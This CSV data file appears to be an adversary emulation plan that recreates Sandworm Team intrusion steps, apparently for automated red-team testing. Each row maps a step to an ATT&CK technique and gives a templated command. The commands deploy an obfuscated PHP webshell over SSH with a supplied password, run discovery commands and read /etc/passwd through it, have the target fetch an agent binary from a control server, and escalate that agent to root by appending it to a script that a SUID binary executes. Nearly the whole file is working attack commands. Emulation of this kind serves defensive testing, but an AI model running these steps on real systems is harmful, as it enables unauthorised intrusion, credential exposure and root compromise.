source_org,plan_id,adversary_name,scenario_id,step_idx,yaml_step_id,procedure_step,tactic,technique_attack_id,technique_name,name,description,command_summary,command_full
sandworm,sandworm,Sandworm Team (G0034),11,1,60c4ddd6-2ce0-4f5c-8ddb-c5eccd744686,11.A.1-3,command-and-control,T1105,Ingress Tool Transfer,Sandworm Initial Compromise - Transfer Webshell,"Sandworm logs into patient zero via SSH using Valid Accounts. It is unknown how Sandworm obtained the credentials (perhaps an SSH password guessing attack, or zero day exploit). Sandworm then deploys a PHP webshell for persistent access. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires sshpass to be installed on attacker-controlled machine (sudo apt install sshpass).",chmod a+r obfuscated_webShell.php; sshpass -p #{initial.user.password} scp ./obfuscated_webShell.php #{initial.user.name}@#{initial.target.host}:/tmp/search.php,"chmod a+r obfuscated_webShell.php;
sshpass -p #{initial.user.password} scp ./obfuscated_webShell.php #{initial.user.name}@#{initial.target.host}:/tmp/search.php"
sandworm,sandworm,Sandworm Team (G0034),11,2,6249ff61-75ec-4ead-8ca2-e8d9fbbc225a,11.A.4,persistence,T1505.003,Server Software Component: Web Shell,Sandworm Initial Compromise - Deploy Webshell,"Sandworm logs into patient zero via SSH using Valid Accounts. It is unknown how Sandworm obtained the credentials (perhaps an SSH password guessing attack, or zero day exploit). Sandworm then deploys a PHP webshell for persistent access. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires sshpass to be installed on attacker-controlled machine (sudo apt install sshpass).","sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} ""sudo mv /tmp/search.php /var/www/html/"";","sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} ""sudo mv /tmp/search.php /var/www/html/"";"
sandworm,sandworm,Sandworm Team (G0034),12,3,06dd8117-caaf-4535-a70f-cc31268fd9b8,12.A.1-2,discovery,T1033,System Owner/User Discovery,Sandworm Initial Discovery via Webshell - Whoami,"Sandworm collects the username from a compromised host by issuing shell commands through the PHP webshell. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.","curl --insecure ""https://#{initial.target.host}/search.php?cmd=whoami"" 2>/dev/null","curl --insecure ""https://#{initial.target.host}/search.php?cmd=whoami"" 2>/dev/null"
sandworm,sandworm,Sandworm Team (G0034),12,4,75efc0b8-eafa-4300-8e7b-5e56179944e8,12.A.3,discovery,T1082,System Information Discovery,Sandworm Initial Discovery via Webshell - Uname,"Sandworm enumerates information about the infected system's operating system by issuing shell commands through the PHP webshell. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.","curl --insecure ""https://#{initial.target.host}/search.php?cmd=uname+-a"" 2>/dev/null","curl --insecure ""https://#{initial.target.host}/search.php?cmd=uname+-a"" 2>/dev/null"
sandworm,sandworm,Sandworm Team (G0034),12,5,65dd006d-a76e-423d-83f2-6c29b66690e1,12.A.4,discovery,T1083,File and Directory Discovery,Sandworm Initial Discovery via Webshell - ls,"Sandworm enumerates files on a compromised host by issuing shell commands through the PHP webshell. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.","curl --insecure ""https://#{initial.target.host}/search.php?cmd=ls+-lsahR+/"" 2>/dev/null","curl --insecure ""https://#{initial.target.host}/search.php?cmd=ls+-lsahR+/"" 2>/dev/null"
sandworm,sandworm,Sandworm Team (G0034),12,6,c7e4a043-e67a-4199-8e52-d7d5219a7614,12.A.5,credential-access,T1003.008,OS Credential Dumping: /etc/passwd and /etc/shadow,Sandworm Initial Discovery via Webshell - cat /etc/passwd,"Sandworm displays the /etc/passwd file on a compromised host by issuing shell commands through the PHP webshell. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.","curl --insecure ""https://#{initial.target.host}/search.php?cmd=cat+/etc/passwd"" 2>/dev/null","curl --insecure ""https://#{initial.target.host}/search.php?cmd=cat+/etc/passwd"" 2>/dev/null"
sandworm,sandworm,Sandworm Team (G0034),13,7,a85bd5a0-c977-4fd1-b339-97fffed54f8c,13.A.1,command-and-control,T1105,Ingress Tool Transfer,Sandworm Download Agent Executable,"Sandworm downloads an ELF executable from the control server using curl. Once downloaded to disk, Sandworm sets the file permissions to read-write-execute. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.","curl --insecure ""https://#{initial.target.host}/search.php?cmd=curl+--insecure+-X+POST+-H+file:sandcat.go+-H+platform:linux+-H+server:#{server}+-H+group:caladan+#{server}/file/download+-o+centreon_module_linux_app64"" ...","curl --insecure ""https://#{initial.target.host}/search.php?cmd=curl+--insecure+-X+POST+-H+file:sandcat.go+-H+platform:linux+-H+server:#{server}+-H+group:caladan+#{server}/file/download+-o+centreon_module_linux_app64"" 2>/dev/null;
curl --insecure ""https://#{initial.target.host}/search.php?cmd=ls+-lsah"" 2>/dev/null;
curl --insecure ""https://#{initial.target.host}/search.php?cmd=chmod+755+centreon_module_linux_app64"" 2>/dev/null;"
sandworm,sandworm,Sandworm Team (G0034),13,8,decf0a4d-6ff1-474f-af0c-5b652401a5e4,13.A.2,privilege-escalation,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Sandworm Set Up SUID for Agent Execution,"Sandworm executes the downloaded agent executable by running SUID binary /bin/backup. This binary executes check.sh, which causes the agent to be executed with root privileges. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.","curl --insecure ""https://#{initial.target.host}/search.php?cmd=echo%20%27%2Fvar%2Fwww%2Fhtml%2Fcentreon_module_linux_app64%20%26%27%20%3E%3E%20%2Fvar%2Fwww%2Fhtml%2Finclude%2Ftools%2Fcheck.sh"" 2>/dev/null;","curl --insecure ""https://#{initial.target.host}/search.php?cmd=echo%20%27%2Fvar%2Fwww%2Fhtml%2Fcentreon_module_linux_app64%20%26%27%20%3E%3E%20%2Fvar%2Fwww%2Fhtml%2Finclude%2Ftools%2Fcheck.sh"" 2>/dev/null;"
sandworm,sandworm,Sandworm Team (G0034),13,9,8ba8405b-d8b9-4c9d-ae8e-3b21ae8f64c6,13.A.2-5,privilege-escalation,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Sandworm Execute Agent via SUID Binary,"Sandworm executes the downloaded agent executable by running SUID binary /bin/backup. This binary executes check.sh, which causes the agent to be executed with root privileges. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires curl to be installed on the attacker-controlled machine.","exec-background curl -s --insecure ""https://#{initial.target.host}/search.php?cmd=/bin/backup""","exec-background curl -s --insecure ""https://#{initial.target.host}/search.php?cmd=/bin/backup"""
sandworm,sandworm,Sandworm Team (G0034),13,10,c3f875d8-ab9b-46ef-acf6-7926f7b93d78,13.A.2-5,privilege-escalation,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Sandworm Wait For Priv Esc Agent Beacon,Wait for the SUID privilege escalation to spawn an elevated agent beacon. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).,sleep 40,sleep 40
